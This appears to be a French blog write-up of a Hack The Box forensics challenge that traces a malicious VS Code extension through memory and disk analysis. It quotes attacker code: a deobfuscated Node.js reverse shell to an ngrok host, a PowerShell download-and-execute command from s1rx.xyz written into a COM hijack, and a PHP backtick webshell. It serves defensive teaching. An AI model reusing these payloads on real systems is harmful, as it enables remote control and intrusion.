---
title: "ReliableThreat"
date: 2026-06-20
side: "blue"
tags: ["htb", "windows", "sherlock", "dfir", "memory-forensics", "com-hijacking"]
summary: "Sherlock DFIR Windows : d'une extension VS Code malveillante à la compromission complète d'un poste, en corrélant dump mémoire et image disque. Reverse engineering du payload, persistance par COM hijacking et webshell PHP."
draft: false
---

*Sherlock orienté DFIR (parcours CDSA), plateforme Hack The Box. Investigation sur dump mémoire (Volatility 3) et image disque (FTK Imager, Ghidra, EZ Tools, Git, déobfuscateur JS).*

## Contexte

> Fuite de code source suspectée. Un employé est soupçonné mais nie tout téléchargement de programme externe. Investigation DFIR sur un dump mémoire Windows et une image disque (FTK Imager ne montre que les profils `Public` et `User2`).

## Résolu

![Sherlock ReliableThreat résolu](/images/reliablethreat.png)

## Résumé exécutif - kill chain

L'intrusion démarre par une **extension VS Code malveillante** (`0xs1rx58d3v.chatgpt-b0t`) installée sur le poste de `User2`. Lorsqu'un utilisateur tape un message contenant **`help`** dans le chatbot de l'extension, un payload JavaScript obfusqué s'exécute et ouvre un **reverse shell** vers `6.tcp.eu.ngrok.io:16587`. La chaîne de processus aboutit à `RuntimeBroker.exe` (masquerading) déposé dans `C:\Users\Public`, qui communique avec un C2 sur `18.197.239.5:18854`.

L'attaquant établit ensuite une **persistance par COM hijacking** sur le CLSID de la Corbeille (`temp.exe` écrit une clé qui télécharge et lance un second stage via PowerShell depuis `s1rx.xyz`), puis injecte un **webshell PHP** dans le point d'entrée d'un projet Laravel pour garantir une réentrée.

```
Extension VS Code (chatgpt-b0t)
   └─ trigger: input "help"
        └─ payload JS obfusqué -> reverse shell ngrok (6.tcp.eu.ngrok.io:16587)
             └─ Code.exe -> node host (PID 1612) -> cmd (PID 4196) -> RuntimeBroker.exe (PID 1224) -> C2 18.197.239.5:18854

Persistance #1 : COM hijack Corbeille  (temp.exe -> HKLM\...\CLSID\{645FF040-...}\shell\open\command -> PowerShell -> s1rx.xyz/tmp.exe)
Persistance #2 : webshell PHP          (public/index.php -> $_GET['s1'] + backticks)
```


---

## Task 1 - What is the application that starts the suspicious chain of processes?

**Réponse : `Code.exe`**

Listing de l'arbre des processus (la sortie de `pstree` en Vol3 inclut déjà la ligne de commande) :

```bash
vol -q -f memdump.dmp windows.pstree
```

On repère `RuntimeBroker.exe` exécuté depuis `C:\Users\Public`, anormal, car le vrai RuntimeBroker tourne depuis `System32` avec l'argument `-Embedding`, parenté par `svchost`. En remontant la filiation PID/PPID :

```
8108  Code.exe                                    (VS Code, processus principal)
 └─ 1612  Code.exe --type=utility --utility-sub-type=node.mojom.NodeService   (extension host)
     └─ 4196  cmd.exe /d /s /c "C:\Users\Public\RuntimeBroker.exe"
         └─ 1224  RuntimeBroker.exe                (implant)
```

> **Point méthodo.** `pstree` est un *snapshot* : un lien parent-enfant peut être cassé si le processus intermédiaire est mort avant le dump. Ici la chaîne est intacte et remonte mécaniquement jusqu'à `Code.exe`. Le chemin `Public` n'est pas un IOC en soi, c'est le **masquerading** (T1036.005) du nom `RuntimeBroker.exe` hors de `System32` qui qualifie le binaire.

---

## Task 2 - Provide the full path of the malicious file used to gain initial access.

**Réponse : `C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js`**

Le scénario « supply chain » plus VS Code oriente vers une **extension malveillante**. Les extensions vivent dans `%USERPROFILE%\.vscode\extensions`. On énumère celles présentes en mémoire :

```bash
vol -q -f memdump.dmp windows.filescan | findstr /i "extensions" | findstr /i "vscode"
```

Dans la dernière ligne, on trouve une ligne suspecte :

```
\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\package.json
\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js
```

L'intrus se distingue par son **identifiant de dossier** : publisher inconnu (`0xs1rx58d3v`), typosquat (`chatgpt-b0t`, zéro à la place du « o »), version `0.0.1`, et `extension.js` placé à la **racine** du dossier (les extensions légitimes le rangent sous `out\src\`).

> **Note.** `windows.filescan` émet les chemins en format device NT (`\Device\HarddiskVolumeX\...`) **sans lettre de lecteur**. Un filtre `findstr "c:\Users..."` ne matche jamais sa sortie, filtrer sur `vscode` / `extension.js` à la place. Accès initial = **vecteur d'entrée** (TA0001), à distinguer de `RuntimeBroker.exe` qui est l'agent C2 (TA0011).

---

## Task 3 - What user input, when executed, will run the malicious code?

**Réponse : `help`**

Dump du fichier avec l'offset récupéré de extension.js et celui du package.json avec la commande précédente (l'erreur de dump est bénigne, le fichier est tout de même extrait) :

```bash
vol -q -f memdump.dmp windows.dumpfiles --virtaddr 0x850cd2e704f0

DataSectionObject       0x850cd2e704f0  extension.js    Error dumping file
```

```bash
vol -q -f memdump.dmp windows.dumpfiles --virtaddr 0x850cd16d92b0

DataSectionObject       0x850cd16d92b0  package.json
```

on lit le fichier extrait. Le `package.json` de l'extension :

```json
"activationEvents": [],
"main": "./extension.js",
"contributes": { "commands": [ { "command": "chatbot.start", "title": "Chatbot: Start" } ] }
```

Dans `extension.js`, la commande `chatbot.start` ouvre une `showInputBox`. Le message saisi passe dans une cascade de `if/else if`. Le branch piégé :

```javascript
} else if (userInput.toLowerCase().includes('help')) {
    response = 'You can ask me about programming languages...';
    /* ---- payload JS obfusqué exécuté ici ---- */
    response = 'An algorithm is a set of instructions...';
}
```

C'est un `.includes('help')` (sous-chaîne, pas égalité) : tout message contenant `help` déclenche le payload.

---

## Task 4 - What are the hostname and port used to establish a reverse shell?

**Réponse : `6.tcp.eu.ngrok.io:16587`**

Le bloc obfusqué (obfuscator.io : string-array `_0x3e52` plus décodeur `_0x423e` plus rotation IIFE) est déobfusqué via <https://obf-io.deobfuscate.io/>. Code reconstruit :

```javascript
const net = require("net");
const lockFilePath = path.join(os.homedir(), '.' + pid + ".lock");
if (!fs.existsSync(lockFilePath)) {
  fs.writeFile(lockFilePath, '', () => {});
  (function () {
    const socket = new net.Socket();
    socket.connect(16587, "6.tcp.eu.ngrok.io");
    socket.on("data", data => {
      const command = data.toString();
      require("child_process").exec(command, (error, stdout, stderr) => {
        socket.write(error ? stderr : stdout);
      });
    });
  })();
}
```

Reverse shell complet : connexion à `6.tcp.eu.ngrok.io:16587`, exécution des commandes reçues via `child_process.exec`, renvoi de la sortie. Le lockfile sert de mutex (une seule instance).

> **À noter.** Ce port (16587) **diffère** de celui de `RuntimeBroker.exe` (18854) : deux canaux distincts.

---

## Task 5 - What is the display name of the developer who created this malicious file?

**Réponse : `0xS1rx58.D3V`**

Le **display name** de l'auteur figure dans le `package.json` : `Publisher Name: 0xS1rx58.D3V` (à distinguer de l'identifiant de dossier `0xs1rx58d3v`).

---

## Task 6 - What time was the malicious file released? (UTC).

**Réponse : `2024-07-23 00:41:19`**

Pour cette réponse, j'ai dû aller voir le writeup officiel qui expliquait qu'il fallait aller sur le marketplace de vscode à l'adresse: `https://marketplace.visualstudio.com/items?itemName=0xS1rx58D3V.ChatGPT-B0T`. Mais elle a été supprimé depuis. Donc j'ai rentré l'adresse sur `wayback machine` : `https://web.archive.org/web/20240729232553/https://marketplace.visualstudio.com/items?itemName=0xS1rx58D3V.ChatGPT-B0T`
La date de release est affichée sur la page Marketplace, **dans le fuseau local du navigateur**. L'affichage montrait `02:41:19` en CEST (UTC+2) -> conversion en UTC : **`2024-07-23 00:41:19`**.

---

## Task 7 - Provide the SID for the user who has been compromised.

**Réponse : `S-1-5-21-1998887770-13753423-1649717590-1001`**

```bash
vol -q -f memdump.dmp windows.getsids | grep User2
```

`windows.getsids` associe chaque processus à son SID propriétaire, la preuve d'attribution (un nom dans un chemin n'est qu'un indice, le SID est la preuve).

---

## Task 8 - Provide the full path of the suspicious executable being run during the infection chain.

**Réponse : `C:\Users\Public\RuntimeBroker.exe`**

Confirmation réseau de l'implant :

```bash
vol -q -f memdump.dmp windows.netscan | findstr /i "1224"
```

```
TCPv4  192.168.122.54:49814  ->  18.197.239.5:18854  ESTABLISHED  1224  RuntimeBroker.
```

`RuntimeBroker.exe` (PID 1224, depuis `C:\Users\Public`) maintient une connexion établie vers le C2 `18.197.239.5:18854` (IP AWS, associée à NjRAT selon les sources de réputation).

---

## Task 9 - The threat actor has modified the Windows registry to include a new entry. This change ensures that whenever a legitimate component runs, it triggers the malicious process, allowing the threat actor to maintain control of the system. Specify the name of the legitimate component.

**Réponse : `Recycle Bin` (Corbeille)**

Sur disque, `C:\Users\Public` ne contient pas `RuntimeBroker.exe` mais un `temp.exe`. Décompilé dans Ghidra, son `main` :

```c
local_10 = "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell";
local_18 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Powershell.exe -ExecutionPolicy Bypass "
           "-Command \"(New-Object Net.WebClient).DownloadFile('http://s1rx.xyz/tmp.exe', "
           "'C:\\Windows\\Temp\\tmp.exe'); Start-Process 'C:\\Windows\\Temp\\tmp.exe'\"";
```

Ce code C est un peu compliqué à lire quand on a pas l'habitude mais un LLM avec un modèle gratuit déchiffre ça facilement et peu coûteux en token:

```c
RegOpenKeyExA((HKEY)0x80000002, local_10, 0, 0x20006, &local_28);   // 0x80000002 = HKLM
RegCreateKeyExA(local_28, "open\\command", ...);                     // crée \shell\open\command
RegSetValueExA(local_30, (LPCSTR)0x0, 0, 1, local_18, ...);          // (Default) = REG_SZ payload
```

`temp.exe` écrit dans `HKLM\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command` une commande PowerShell qui télécharge et exécute `tmp.exe` depuis `s1rx.xyz`.

Le CLSID `{645FF040-5081-101B-9F08-00AA002F954E}` correspond à la **Recycle Bin** (valeur par défaut de la clé CLSID = `"Recycle Bin"`). Quand la Corbeille est invoquée, le `\shell\open\command` détourné déclenche le payload.

> **Note Volatility.** La branche `\shell\open\command` était **non résidente** en mémoire (`printkey` renvoie la clé avec un LastWrite vide et ne descend pas). Le contenu a été reconstruit via la **décompilation du dropper**, le binaire qui écrit la clé contient la définition de la clé. Un CLSID ne stocke jamais le nom humain du composant : la correspondance GUID->nom vient de la documentation.

---

## Task 10 - Which MITRE technique corresponds to the previous action?

En tapant dans un navigateur simplement quelque chose du genre `mitre attack persistence clsid recycle bin`, tu tombes sur une sous-technique T1546 décrivant l'attaque que l'on analyse.

**Réponse : `T1546.015`** (Event Triggered Execution: Component Object Model Hijacking)

---

## Task 11 - The threat actor has identified the location for all projects and manipulated one of the project files. Could you provide details about the malicious code that was added by the threat actor?

**Réponse :**

```php
$testc = $_GET['s1']; echo `$testc`;
```

Les projets de dev sont sur le bureau de `User2` (`Users\User2\Desktop\...`, 5 projets, profil PHP/Laravel, cohérent avec MySQL plus l'extension DevSense PHP observés). Le projet Laravel contient un dépôt Git ; on inspecte l'état du working tree :

```bash
git diff
```

```diff
diff --git a/public/index.php b/public/index.php
index 9da023e..7d23163 100644
--- a/public/index.php
+++ b/public/index.php
@@ -11,6 +11,8 @@
 // Register the Composer autoloader...
+$testc = $_GET['s1']; echo `$testc`;
+
 require __DIR__.'/../vendor/autoload.php';
```

Webshell RCE planté dans `public/index.php` (point d'entrée HTTP de Laravel, exécuté à chaque requête) :

- `$_GET['s1']` -> paramètre HTTP `s1` (signature `s1`),
- backticks `` `$testc` `` -> opérateur d'exécution shell de PHP (équiv. `shell_exec`),
- `echo` -> renvoie la sortie dans la réponse.

Exemple : `index.php?s1=whoami` exécute `whoami` sur le serveur. MITRE **T1505.003** (Web Shell).

> **Point méthodo décisif.** Deux dossiers `Project` existent : celui de `Users\Public` (extrait de `filex221.zip`, l'archive d'exfil de l'attaquant, **version propre**) et celui de `Users\User2\Desktop` (état **live** de l'image disque, **version piégée**). Le webshell étant une modification *non commitée*, il n'apparaît que dans le working tree live. Sur la copie issue du zip, `git diff` renvoie vide, non pas par bug, mais parce que l'IOC n'y est pas. **Pour du code injecté non versionné, la source de vérité est le fichier sur l'image disque, jamais une archive dérivée.** Les deux commits `still under test` (auteur `a.dev5520@s1r.org`) n'ajoutaient qu'un commentaire et une ligne vide : des leurres.

---

## IOC

**Réseau**

- `18.197.239.5:18854` : C2 de `RuntimeBroker.exe` (AWS, NjRAT)
- `6.tcp.eu.ngrok.io:16587` : reverse shell du payload de l'extension
- `s1rx.xyz` : host de download du second stage (`http://s1rx.xyz/tmp.exe`)

**Fichiers**

- `C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js` : extension malveillante
- `C:\Users\Public\RuntimeBroker.exe` : implant C2 (masquerading)
- `C:\Users\Public\temp.exe` : dropper de persistance COM
- `C:\Windows\Temp\tmp.exe` : second stage téléchargé
- `public/index.php` (projet Laravel) : webshell PHP

**Registre**

- `HKLM\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command` : COM hijack shell Corbeille
